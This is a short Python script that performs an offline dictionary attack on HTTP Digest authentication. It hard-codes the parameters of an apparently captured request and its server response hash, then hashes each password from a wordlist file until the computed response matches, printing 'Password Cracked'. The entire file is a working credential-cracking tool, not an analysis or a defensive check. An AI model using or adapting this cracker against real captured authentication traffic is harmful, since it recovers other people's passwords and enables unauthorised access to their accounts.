#RFC 2617 Digest Access Authentication Syntax
#Hash1=MD5(username:realm:password)
#Hash2=MD5(method:digestURI)
#response=MD5(Hash1:nonce:nonceCount:cnonce:qop:Hash2)

import hashlib
import sys
#Hash1Details
username = "username"
realm = "REALM"
password = ""
passwordList = "passwordList.txt"

#Hash2Details
method = "GET"
URI = "/incl/pos.js?ver=6.50.1.2"

#ResponseDetails
nonce = "D2Orgm+vBQA=2bc7969dc8fbcc6cfc83e1fbb913211ff8e4deba"
nonceCount = "00000002"
cnonce = "220d8db35e456e816af3d5da914d4bda"
qop = "auth"
response = "609df112a46f2bda01f999526797cd45"

file = open(passwordList,"r")

h2 =hashlib.md5((method + ":" + URI).encode("utf-8")).hexdigest()

for pwd in file:
    print(pwd)
    h1 = hashlib.md5((username + ":" + realm + ":" + pwd.strip()).encode("utf-8")).hexdigest()
    respString = h1 + ":" + nonce + ":" + nonceCount + ":" + cnonce + ":" + qop + ":" + h2
    resp = hashlib.md5((respString).encode("utf-8")).hexdigest()
    print("Checking Password: " + pwd)
    print("Hash1:             " + h1)
    print("Hash2:             " + h2)
    print("Calculated Resp:   " + resp)
    print("Server Resp:       " + response)
    if (resp == response):
        print("Password Cracked:  TRUE") 
        sys.exit()
    else:
        print("Password Cracked:  FALSE") 
    
  